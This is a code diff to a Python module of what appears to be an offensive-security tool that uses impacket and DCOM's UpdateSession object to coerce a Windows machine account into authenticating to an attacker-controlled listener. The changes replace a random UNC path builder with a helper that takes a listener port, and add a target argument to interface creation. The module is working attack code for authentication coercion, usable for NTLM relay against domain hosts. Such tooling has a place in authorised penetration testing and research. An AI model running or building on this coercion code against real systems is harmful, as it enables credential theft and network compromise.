@@ -1,9 +1,8 @@
 """DCOM UpdateSession trigger function (machine account coercion)."""
 
 import logging
-import random
-import string
 
+from bigpotam.paths import dcom_unc
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.dcom.oaut import (
     DISPATCH_METHOD,
@@ -42,10 +41,6 @@ _OBJREF_PARSERS = {
 }
 
 
-def _rnd(n: int = 4) -> str:
-    return "".join(random.choices(string.ascii_letters, k=n))
-
-
 def _get_interface(dispatch, data):
     """Extract IDispatch interface from variant result."""
     raw = b"".join(data)
@@ -57,7 +52,7 @@ def _get_interface(dispatch, data):
         objref = parser(raw)
 
     return IRemUnknown2(
-        INTERFACE(dispatch.get_cinstance(), objref),
+        INTERFACE(dispatch.get_cinstance(), objref, target=dispatch.get_target()),
     )
 
 
@@ -84,6 +79,7 @@ def _dcom_disconnect(dcom) -> None:
 def trigger_update_session(
     target: str,
     listener: str,
+    listener_port: int = 445,
     username: str = "",
     password: str = "",
     domain: str = "",
@@ -157,8 +153,7 @@ def trigger_update_session(
             ("AddScanPackageService",),
         )[0]
 
-        # Build UNC path with random share and filename
-        unc_path = f"\\\\{listener}\\{_rnd()}\\{_rnd()}.txt"
+        unc_path = dcom_unc(listener, listener_port)
 
         params = DISPPARAMS(None, False)
         params["rgdispidNamedArgs"] = NULL
